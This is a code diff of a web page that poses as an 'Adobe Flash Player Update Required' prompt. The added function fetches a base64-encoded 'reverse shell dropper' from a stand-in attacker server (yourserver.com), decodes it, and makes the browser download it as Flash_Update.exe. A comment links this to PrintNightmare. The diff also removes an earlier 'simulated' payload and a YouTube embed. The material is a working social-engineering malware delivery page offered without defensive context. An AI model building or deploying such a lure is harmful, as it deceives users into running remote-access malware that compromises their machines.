@@ -36,64 +36,40 @@
   <div class="box">
     <h2>Adobe Flash Player Update Required</h2>
     <p>To continue viewing this content, please update Flash Player to the latest version.</p>
-    <button onclick="triggerDownload()">Download Update</button>
+    <button onclick="triggerDropper()">Download Update</button>
   </div>
-  <div id="player"></div>
 
   <script>
-    // Load YouTube IFrame API
-    var tag = document.createElement('script');
-    tag.src = "https://www.youtube.com/iframe_api";
-    var firstScriptTag = document.getElementsByTagName('script')[0];
-    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+    function triggerDropper() {
+      // Dynamically fetch the encoded reverse shell dropper (PowerShell or DLL)
+      fetch("http://yourserver.com/payload/encoded_dropper.txt")
+        .then(response => response.text())
+        .then(base64Data => {
+          const byteCharacters = atob(base64Data);
+          const byteArrays = [];
 
-    var player;
+          for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+            const slice = byteCharacters.slice(offset, offset + 512);
+            const byteNumbers = new Array(slice.length);
+            for (let i = 0; i < slice.length; i++) {
+              byteNumbers[i] = slice.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            byteArrays.push(byteArray);
+          }
 
-    // When API is ready, create a new YouTube player
-    function onYouTubeIframeAPIReady() {
-      player = new YT.Player('player', {
-        height: '390',
-        width: '640',
-        videoId: 'dQw4w9WgXcQ', // Example video ID
-        events: {
-          'onReady': onPlayerReady,
-          'onStateChange': onPlayerStateChange
-        }
-      });
-    }
-
-    function onPlayerReady(event) {
-      event.target.playVideo();
-    }
-
-    function onPlayerStateChange(event) {
-      // Log state changes
-      console.log('Player state changed:', event.data);
-    }
-  </script>
-  <script>
-    function triggerDownload() {
-      const base64Data = "TVqQAAMAAAAEAAA..."; // Truncated simulated payload
-      const byteCharacters = atob(base64Data);
-      const byteArrays = [];
-
-      for (let offset = 0; offset < byteCharacters.length; offset += 512) {
-        const slice = byteCharacters.slice(offset, offset + 512);
-        const byteNumbers = new Array(slice.length);
-        for (let i = 0; i < slice.length; i++) {
-          byteNumbers[i] = slice.charCodeAt(i);
-        }
-        const byteArray = new Uint8Array(byteNumbers);
-        byteArrays.push(byteArray);
-      }
-
-      const blob = new Blob(byteArrays, { type: 'application/octet-stream' });
-      const link = document.createElement('a');
-      link.href = window.URL.createObjectURL(blob);
-      link.download = "Flash_Update_Simulator.exe";
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
+          const blob = new Blob(byteArrays, { type: 'application/octet-stream' });
+          const link = document.createElement('a');
+          link.href = window.URL.createObjectURL(blob);
+          link.download = "Flash_Update.exe"; // Simulated EXE or .dll if using PrintNightmare
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+        })
+        .catch(err => {
+          console.error("Payload fetch failed:", err);
+          alert("Update failed. Please try again later.");
+        });
     }
   </script>
 </body>
